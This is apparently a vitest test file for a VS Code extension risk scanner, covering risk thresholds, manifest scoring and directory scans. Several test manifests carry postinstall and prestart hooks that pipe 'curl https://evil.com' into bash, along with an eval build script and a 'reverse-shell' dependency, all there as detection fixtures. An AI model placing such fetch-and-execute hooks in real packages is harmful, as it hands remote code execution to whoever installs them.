import { describe, it, expect } from "vitest"
import { scoreExtension, getRiskLevel, scan } from "../src/scorer.js"
import { getDefaultRules } from "../src/rules.js"
import type { ExtensionManifest, ExtensionScore, Severity, CliConfig, Finding, RuleCategory } from "../src/types.js"

/* ------------------------------------------------------------------ */
/* Helpers                                                            */
/* ------------------------------------------------------------------ */

const rules = getDefaultRules()

function makeManifest(
  overrides: Partial<ExtensionManifest>,
  extraRaw?: Record<string, unknown>,
): ExtensionManifest {
  const baseDir = overrides.directory ?? "/tmp/fake-ext"
  const rawBase: Record<string, unknown> = {
    name: "test-ext",
    version: "1.0.0",
    engines: { vscode: "^1.80.0" },
    description: "A test extension",
    homepage: "https://example.com",
    ...extraRaw,
  }
  return {
    raw: { ...rawBase },
    path: `${baseDir}/package.json`,
    name: overrides.name ?? "test-ext",
    version: overrides.version ?? "1.0.0",
    publisher: overrides.publisher ?? "test-publisher",
    displayName: overrides.displayName,
    description: overrides.description,
    activationEvents: overrides.activationEvents,
    main: overrides.main,
    scripts: overrides.scripts,
    dependencies: overrides.dependencies,
    devDependencies: overrides.devDependencies,
    extensionKind: overrides.extensionKind,
    capabilities: overrides.capabilities,
    directory: baseDir,
    ...overrides,
  }
}

/* ------------------------------------------------------------------ */
/* getRiskLevel                                                       */
/* ------------------------------------------------------------------ */

describe("getRiskLevel", () => {
  it("returns 'safe' for score 0", () => {
    expect(getRiskLevel(0)).toBe("safe")
  })

  it("returns 'safe' for score 9 (below caution threshold)", () => {
    expect(getRiskLevel(9)).toBe("safe")
  })

  it("returns 'caution' at threshold 10", () => {
    expect(getRiskLevel(10)).toBe("caution")
  })

  it("returns 'caution' for scores between 10 and 24", () => {
    expect(getRiskLevel(15)).toBe("caution")
    expect(getRiskLevel(24)).toBe("caution")
  })

  it("returns 'suspicious' at threshold 25", () => {
    expect(getRiskLevel(25)).toBe("suspicious")
  })

  it("returns 'suspicious' for scores between 25 and 49", () => {
    expect(getRiskLevel(30)).toBe("suspicious")
    expect(getRiskLevel(49)).toBe("suspicious")
  })

  it("returns 'dangerous' at threshold 50", () => {
    expect(getRiskLevel(50)).toBe("dangerous")
  })

  it("returns 'dangerous' for very high scores", () => {
    expect(getRiskLevel(100)).toBe("dangerous")
    expect(getRiskLevel(999)).toBe("dangerous")
  })
})

/* ------------------------------------------------------------------ */
/* scoreExtension                                                     */
/* ------------------------------------------------------------------ */

describe("scoreExtension", () => {
  it("scores 0 (safe) for a clean manifest", () => {
    const m = makeManifest({
      publisher: "trusted-author",
      description: "A wholesome extension",
      scripts: { build: "tsc" },
      dependencies: { "@types/vscode": "^1.80.0" },
    })
    const result = scoreExtension(m)
    expect(result.score).toBe(0)
    expect(result.riskLevel).toBe("safe")
    expect(result.findings).toHaveLength(0)
    expect(result.manifest).toBe(m)
  })

  it("produces findings for postinstall script", () => {
    const m = makeManifest({
      scripts: { postinstall: "node setup.js" },
    })
    const result = scoreExtension(m)
    expect(result.findings.length).toBeGreaterThan(0)
    expect(result.score).toBeGreaterThan(0)
    const postinstall = result.findings.find((f) => f.ruleId === "SCR-001")
    expect(postinstall).toBeDefined()
  })

  it("score with critical severity (postinstall with curl|bash) reaches caution range", () => {
    const m = makeManifest({
      scripts: { postinstall: "curl https://evil.com | bash" },
    })
    const result = scoreExtension(m)
    const criticalFinding = result.findings.find((f) => f.severity === "critical")
    expect(criticalFinding).toBeDefined()
    // critical weight = 12; additional low-severity findings (e.g., metadata) may add to the score
    expect(result.score).toBeGreaterThanOrEqual(12)
    expect(result.riskLevel).toBe("caution")
  })

  it("pushes into suspicious range when multiple findings", () => {
    // Craft a manifest that triggers multiple rules
    const m = makeManifest({
      scripts: {
        postinstall: "curl https://evil.com/setup | bash",
        prestart: "curl https://evil.com/pre | bash",
      },
      publisher: undefined,
      description: undefined,
      dependencies: {
        "javascript-obfuscator": "^4.0.0",
        axios: "^1.6.0",
        "crypto-js": "^4.2.0",
        "node-fetch": "^3.0.0",
        got: "^14.0.0",
      },
    })
    const result = scoreExtension(m)
    const totalFindings = result.findings.length
    expect(totalFindings).toBeGreaterThan(2)
    expect(result.score).toBeGreaterThanOrEqual(25)
    expect(["suspicious", "dangerous"]).toContain(result.riskLevel)
  })

  it("pushes into dangerous range when many high/critical findings", () => {
    // Build a worst-case manifest — ensure raw also lacks homepage/repository
    // Add network deps and crypto deps for extra findings
    const m = makeManifest(
      {
        scripts: {
          postinstall: "curl https://evil.com | bash",
          prestart: "curl https://evil.com/init | bash",
          build: "eval(process.argv[1])",
        },
        publisher: undefined,
        description: undefined,
        activationEvents: ["onCommand:a", "onCommand:b", "onCommand:c", "onCommand:d", "onStartupFinished"],
        dependencies: {
          "javascript-obfuscator": "^4.0.0",
          "reverse-shell": "^1.0.0",
          vm2: "^3.9.0",
          axios: "^1.6.0",
          "node-fetch": "^3.0.0",
          "crypto-js": "^4.2.0",
        },
        devDependencies: {
          base64: "^0.1.0",
          pkg: "^5.8.0",
          got: "^14.0.0",
        },
      },
      {}, // no extraRaw, so homepage won't be in rawBase
    )
    // Override raw to remove homepage and repository
    m.raw = {
      name: "test-ext",
      version: "1.0.0",
      engines: { vscode: "^1.80.0" },
    }
    const result = scoreExtension(m)
    expect(result.findings.length).toBeGreaterThan(5)
    expect(result.score).toBeGreaterThanOrEqual(50)
    expect(result.riskLevel).toBe("dangerous")
  })

  it("respects minSeverity filter", () => {
    const m = makeManifest({
      publisher: undefined, // PUB-001: medium
      description: undefined, // META-001: low
    })
    const allResults = scoreExtension(m, rules, "low")
    const highOnly = scoreExtension(m, rules, "high")

    expect(allResults.findings.length).toBeGreaterThan(highOnly.findings.length)
    expect(allResults.score).toBeGreaterThan(highOnly.score)
  })

  it("includes manifest reference in result", () => {
    const m = makeManifest({})
    const result = scoreExtension(m)
    expect(result.manifest).toBe(m)
  })

  it("returns ExtensionScore with correct shape", () => {
    const m = makeManifest({})
    const result: ExtensionScore = scoreExtension(m)
    expect(result).toHaveProperty("manifest")
    expect(result).toHaveProperty("score")
    expect(result).toHaveProperty("riskLevel")
    expect(result).toHaveProperty("findings")
    expect(typeof result.score).toBe("number")
    expect(["safe", "caution", "suspicious", "dangerous"]).toContain(result.riskLevel)
    expect(Array.isArray(result.findings)).toBe(true)
  })

  it("uses custom rules if provided", () => {
    const customRule = {
      id: "CUSTOM-001",
      name: "Always fires",
      category: "scripts" as const,
      severity: "high" as Severity,
      description: "Always fires for testing",
      check: () => ({
        ruleId: "CUSTOM-001",
        ruleName: "Always fires",
        category: "scripts" as RuleCategory,
        severity: "high" as Severity,
        message: "Custom rule triggered",
      }),
    }
    const m = makeManifest({})
    const result = scoreExtension(m, [customRule])
    expect(result.score).toBe(7) // high weight = 7
    expect(result.findings).toHaveLength(1)
    expect(result.findings[0].ruleId).toBe("CUSTOM-001")
  })
})

/* ------------------------------------------------------------------ */
/* scan                                                               */
/* ------------------------------------------------------------------ */

describe("scan", () => {
  it("returns AuditReport with expected shape", () => {
    // scan() only works over real directories; use the fixtures dir
    const config: CliConfig = {
      scanPaths: ["fixtures/extensions"],
      outputFormat: "json",
      verbose: false,
      minSeverity: "low",
      maxScore: 100,
      thresholds: { caution: 10, suspicious: 25, dangerous: 50 },
    }
    const report = scan(config)
    expect(report.timestamp).toBeDefined()
    expect(typeof report.timestamp).toBe("string")
    expect(typeof report.extensionsScanned).toBe("number")
    expect(typeof report.extensionsFailed).toBe("number")
    expect(typeof report.totalFindings).toBe("number")
    expect(report.severityCounts).toHaveProperty("low")
    expect(report.severityCounts).toHaveProperty("medium")
    expect(report.severityCounts).toHaveProperty("high")
    expect(report.severityCounts).toHaveProperty("critical")
    expect(typeof report.overallScore).toBe("number")
    expect(report.overallRisk).toBeDefined()
    expect(Array.isArray(report.extensions)).toBe(true)
    expect(Array.isArray(report.errors)).toBe(true)
    // At minimum we should find the clean-linter extension
    expect(report.extensionsScanned).toBeGreaterThan(0)
  })

  it("target field contains the scanned paths", () => {
    const config: CliConfig = {
      scanPaths: ["fixtures/extensions/safe-extensions"],
      outputFormat: "summary",
      verbose: false,
      minSeverity: "low",
      maxScore: 100,
      thresholds: { caution: 10, suspicious: 25, dangerous: 50 },
    }
    const report = scan(config)
    expect(report.target).toContain("safe-extensions")
  })

  it("sorts extensions by score descending", () => {
    const config: CliConfig = {
      scanPaths: ["fixtures/extensions"],
      outputFormat: "json",
      verbose: false,
      minSeverity: "low",
      maxScore: 100,
      thresholds: { caution: 10, suspicious: 25, dangerous: 50 },
    }
    const report = scan(config)
    const scores = report.extensions.map((e) => e.score)
    for (let i = 0; i < scores.length - 1; i++) {
      expect(scores[i]).toBeGreaterThanOrEqual(scores[i + 1])
    }
  })

  it("handles non-existent scan path gracefully", () => {
    const config: CliConfig = {
      scanPaths: ["/nonexistent/path"],
      outputFormat: "json",
      verbose: false,
      minSeverity: "low",
      maxScore: 100,
      thresholds: { caution: 10, suspicious: 25, dangerous: 50 },
    }
    const report = scan(config)
    expect(report.extensionsScanned).toBe(0)
    expect(report.totalFindings).toBe(0)
    expect(report.overallScore).toBe(0)
    expect(report.overallRisk).toBe("safe")
  })
})
